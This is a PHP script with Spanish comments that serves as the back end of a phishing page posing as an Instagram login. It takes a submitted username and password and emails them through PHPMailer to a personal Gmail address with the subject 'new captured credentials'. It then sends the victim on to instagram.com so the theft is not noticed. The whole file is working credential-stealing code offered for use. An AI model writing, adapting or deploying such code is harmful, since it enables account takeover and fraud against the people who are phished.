<?php
// Incluir el autoloader de PHPMailer si se usó Composer
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Cargar el autoloader de Composer
require 'vendor/autoload.php';

// Función para filtrar y validar datos
function sanitize_input($data) {
    return htmlspecialchars(stripslashes(trim($data)));
}

// Comprobar si el formulario fue enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Sanear los datos del formulario
    $user = isset($_POST['user']) ? sanitize_input($_POST['user']) : '';
    $password = isset($_POST['password']) ? sanitize_input($_POST['password']) : '';

    // Validar que los datos no estén vacíos
    if (empty($user) || empty($password)) {
        echo "Por favor, complete todos los campos.";
        exit();
    }

    // Preparar el mensaje
    $mensaje = "Usuario: $user\nContraseña: $password";

    // Configuración de PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Configuración del servidor de correo
        $mail->isSMTP();
        $mail->Host = 'smtp.tuservidor.com'; // Cambia por tu servidor SMTP
        $mail->SMTPAuth = true;
        $mail->Username = 'tuemail@dominio.com'; // Tu dirección de correo
        $mail->Password = 'tucontraseña'; // Tu contraseña de correo
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // Receptores
        $mail->setFrom('tuemail@dominio.com', 'Tu Nombre');
        $mail->addAddress('ibarraleonelmatias73@gmail.com', 'Matías'); // Cambiado a tu correo

        // Contenido del correo
        $mail->isHTML(false);
        $mail->Subject = 'Nuevas credenciales capturadas';
        $mail->Body = $mensaje;

        // Enviar el correo
        if ($mail->send()) {
            // Redirigir al usuario después de un envío exitoso
            header("Location: https://www.instagram.com");
            exit();
        } else {
            echo "Error al enviar el correo.";
        }
    } catch (Exception $e) {
        // Registrar el error en un archivo de log
        error_log("Error de correo: " . $mail->ErrorInfo);
        echo "Hubo un problema al intentar enviar el correo. Por favor, intente más tarde.";
    }
} else {
    echo "Método no permitido.";
}
?>
